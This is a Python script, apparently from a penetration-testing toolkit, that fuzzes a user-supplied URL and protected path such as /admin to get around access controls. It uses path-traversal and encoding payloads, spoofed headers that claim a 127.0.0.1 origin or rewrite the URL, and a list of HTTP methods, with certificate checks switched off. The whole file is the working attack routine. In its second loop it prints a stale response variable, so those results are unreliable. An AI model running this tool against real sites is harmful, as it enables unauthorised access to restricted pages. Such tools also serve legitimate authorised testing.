import requests
import warnings
import argparse
from termcolor import colored
from modules.utilities.request_outputs import url_fuzzer_output, http_method_fuzzer_output

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# Target host
url = input(colored("Enter the target host (ex. https://example.com): ", "blue"))
path = input(colored("Enter the target path (ex. /admin): ", "blue"))

url = url.rstrip('/')
path = path.rstrip('/')

payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","%2500","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23"]

full_url = url+'/'+path
slash_path = '/'+path

print("Target URL: ", url)

# TODO - Implement code reuse
print("\n", "Fuzzing via URL....", "\n")
for payload in payloads:
	try:
		full_url2 = url+slash_path+payload
		req = requests.get(full_url2, allow_redirects=False , verify = False , timeout = 5)
		url_fuzzer_output(full_url2, str(req.status_code))

	except Exception:
		pass

for payload in payloads:
	try:
		full_url3 = url+payload+path
		r = requests.get(full_url3 , allow_redirects=False , verify = False , timeout = 5)
		url_fuzzer_output(full_url3, str(req.status_code))

	except Exception:
		pass


# TODO - Implement code reuse, put header payloads to a list then iterate them in a loop
print("\n", "Fuzzing via HTTP Headers....", "\n")
r1 = requests.get(full_url, headers={"X-Original-URL":path} , allow_redirects=False , verify=False , timeout=5)
if ((str(r1.status_code)) != '404'):
	print(full_url + ' : ' +"(X-Original-URL: "+ path + ')' + ' : ' + str(r1.status_code))

r2 = requests.get(full_url, headers={"X-Custom-IP-Authorization" : "127.0.0.1"} , allow_redirects=False , verify=False , timeout=5)
if ((str(r2.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Custom-IP-Authorization: 127.0.0.1" + ')'+ ' : ' + str(r2.status_code))

r3 = requests.get(full_url, headers={"X-Forwarded-For": "http://127.0.0.1"} , allow_redirects=False , verify=False , timeout=5)
if ((str(r3.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Forwarded-For: http://127.0.0.1" + ')'+ ' : ' + str(r3.status_code))

r4 = requests.get(full_url, headers={"X-Forwarded-For": "127.0.0.1:80"} , allow_redirects=False , verify=False , timeout=5)
if ((str(r4.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Forwarded-For: 127.0.0.1:80" + ')'+ ' : ' + str(r4.status_code))

r5 = requests.get(url, headers={"X-rewrite-url": slash_path} , allow_redirects=False , verify=False , timeout=5)
if ((str(r5.status_code)) != '404'):
	print(full_url + ' : ' + "(X-rewrite-url: {}".format(slash_path) + ')'+ ' : ' + str(r5.status_code))

r6 = requests.get(full_url, headers={'X-Forwarded-Host':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
if ((str(r6.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Forwarded-Host:127.0.0.1" + ')'+ ' : ' + str(r6.status_code))

r7 = requests.get(full_url, headers={'X-Host':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
if ((str(r7.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Host:127.0.0.1" + ')'+ ' : ' + str(r7.status_code))

r8 = requests.get(full_url, headers={'X-Remote-IP':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
if ((str(r8.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Remote-IP:127.0.0.1" + ')'+ ' : ' + str(r8.status_code))

r9 = requests.get(full_url, headers={'X-Originating-IP':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
if ((str(r9.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Originating-IP:127.0.0.1" + ')'+ ' : ' + str(r9.status_code))


print("\n", "Fuzzing via HTTP Methods....", "\n")
with open('./modules/payloads/http_methods.txt') as methods:
	for method in methods:
		method = method.strip('\n')
		request = requests.request("{}".format(method), full_url, allow_redirects=False, verify=False, timeout= 5)
		http_method_fuzzer_output(full_url, str(request.status_code), method)
